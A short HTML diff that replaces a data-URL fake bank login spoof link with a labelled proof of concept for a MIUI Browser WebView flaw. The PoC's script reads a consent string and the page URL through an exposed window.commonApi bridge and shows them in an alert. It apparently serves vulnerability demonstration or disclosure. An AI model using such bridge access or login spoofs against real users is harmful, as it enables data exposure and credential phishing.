@@ -1,7 +1,16 @@
+<!DOCTYPE html>
 <html>
   <body>
-    <a href="data:text/html,<h1>FAKE BANK LOGIN</h1><form><input type=password></form>">
-      Click here (spoof)
-    </a>
+    <h2>MIUI Browser WebView Exploit PoC</h2>
+
+    <script>
+      try {
+        var cmp = window.commonApi.getConsentString();
+        var url = window.commonApi.getUrl();
+        alert("[PoC] ConsentString: " + cmp + "\n[PoC] URL: " + url);
+      } catch (e) {
+        alert("Exploit failed: " + e);
+      }
+    </script>
   </body>
 </html>
